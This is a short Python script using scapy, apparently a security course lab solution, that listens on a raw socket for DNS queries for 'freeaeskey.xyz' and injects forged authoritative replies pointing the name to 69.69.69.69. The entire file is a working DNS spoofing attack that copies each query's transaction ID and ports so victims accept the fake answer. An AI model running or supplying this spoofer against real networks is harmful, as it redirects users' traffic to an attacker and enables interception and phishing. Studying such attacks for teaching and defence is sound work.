#!/usr/bin/python3

from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP, UDP, IP, DNS, DNSQR, DNSRR, sr1, Ether
import socket
import sys

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket=L3RawSocket
    send(pkt)

###
# edit this function to do your attack
###
def handle_pkt(pkt):

    # store current packet
    pkt  = Ether(pkt)

    # domain we are listening for
    domain = 'freeaeskey.xyz'
    spoofed_dns = '69.69.69.69' # nice

    if pkt[IP].haslayer(DNSQR) and not pkt[IP].haslayer(DNSRR):
        if domain in str(pkt[DNSQR].qname):

            dst_ip  = pkt[IP].dst
            src_ip  = pkt[IP].src

            src_prt = pkt[UDP].sport
            dst_prt = pkt[UDP].dport

            dns_id = pkt[DNS].id
            dns_qd = pkt[DNS].qd
            dns_rr = DNSRR(rrname=dns_qd.qname, ttl=10, rdata=spoofed_dns)

            cons_ip  = IP(src=dst_ip, dst=src_ip)
            cons_udp = UDP(dport=src_prt, sport=dst_prt)
            cons_dns = DNS(id=dns_id, qd=dns_qd, aa=1, qr=1, an=dns_rr)

            spoof = cons_ip / cons_udp / cons_dns

            #print(dst_ip)
            #print(src_ip)
            #print(src_prt)
            #print(dst_prt)
            #print(dns_id)
            #print(dns_qd)
            #print(dns_rr)

            inject_pkt(spoof)

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__=='__main__':
    main()
